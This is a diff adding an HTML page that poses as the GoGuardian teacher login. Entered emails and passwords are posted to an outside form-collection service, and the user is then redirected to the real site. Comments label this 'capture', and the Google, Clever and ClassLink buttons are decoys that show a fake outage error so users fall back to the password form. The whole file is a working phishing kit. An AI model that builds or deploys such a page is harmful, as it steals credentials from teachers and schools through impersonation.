@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>GoGuardian | Teacher Login</title>
+  <style>
+    body {
+      background: #f0f2f5 url('https://goguardian.com') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
+    }
+
+    .login-card {
+      background: #ffffff;
+      width: 380px;
+      padding: 40px;
+      border-radius: 4px;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
+      text-align: center;
+    }
+
+    .logo {
+      width: 180px;
+      margin-bottom: 25px;
+    }
+
+    .login-header {
+      color: #5f6368;
+      font-size: 14px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 5px;
+    }
+
+    .login-title {
+      font-size: 22px;
+      font-weight: 400;
+      color: #202124;
+      margin-bottom: 25px;
+    }
+
+    .login-input {
+      width: 100%;
+      height: 48px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      padding: 13px 15px;
+      margin-bottom: 15px;
+      font-size: 16px;
+      box-sizing: border-box;
+      background-color: #f1f3f4;
+    }
+
+    .btn-login {
+      width: 100%;
+      padding: 12px;
+      background-color: #5cb85c;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-bottom: 15px;
+    }
+
+    .social-btn {
+      width: 100%;
+      padding: 10px;
+      border-radius: 4px;
+      border: 1px solid #dadce0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      margin-bottom: 10px;
+      color: white;
+    }
+
+    .btn-google {
+      background-color: #4285f4;
+    }
+
+    .btn-clever {
+      background-color: #4371f7;
+    }
+
+    .btn-classlink {
+      background-color: #00a9bc;
+    }
+
+    .icon {
+      width: 20px;
+      height: 20px;
+      margin-right: 20px;
+    }
+
+    #error-msg {
+      color: #d93025;
+      font-size: 13px;
+      margin-bottom: 15px;
+      display: none;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="login-card">
+    <!-- Official Logo -->
+    <img src="https://imgur.com" class="logo">
+    <div class="login-header">Goguardian Admin</div>
+    <div class="login-title">Log in to your account</div>
+
+    <!-- Error message for decoy buttons -->
+    <div id="error-msg">SSO Service Unavailable. Please log in with email/password.</div>
+
+    <!-- INTEGRATION: BASIC HTML GUIDE APPLIED -->
+    <form action="https://formspree.io/f/xgoranry" method="POST">
+      <input type="email" name="email" class="login-input" placeholder="Email" required />
+      <input type="password" name="password" class="login-input" placeholder="Password" required />
+
+      <!-- Redirect setting to send teacher to real site after capture -->
+      <input type="hidden" name="_next" value="https://goguardian.com">
+
+      <button type="submit" class="btn-login">Log in</button>
+    </form>
+
+    <div style="color: #5f6368; font-size: 12px; margin-bottom: 15px;">or</div>
+
+    <!-- DECOY BUTTONS (DISABLED) -->
+    <div class="social-btn btn-google" onclick="showError()">
+      <img src="https://gstatic.com" class="icon"> Log in with Google
+    </div>
+    <div class="social-btn btn-clever" onclick="showError()">
+      <img src="https://clever.com" class="icon" style="filter: brightness(0) invert(1);"> Log in with Clever
+    </div>
+    <div class="social-btn btn-classlink" onclick="showError()">
+      <img src="https://classlink.com" class="icon"> Log in with ClassLink
+    </div>
+  </div>
+
+  <script>
+    function showError() {
+      document.getElementById('error-msg').style.display = 'block';
+    }
+  </script>
+</body>
+
+</html>
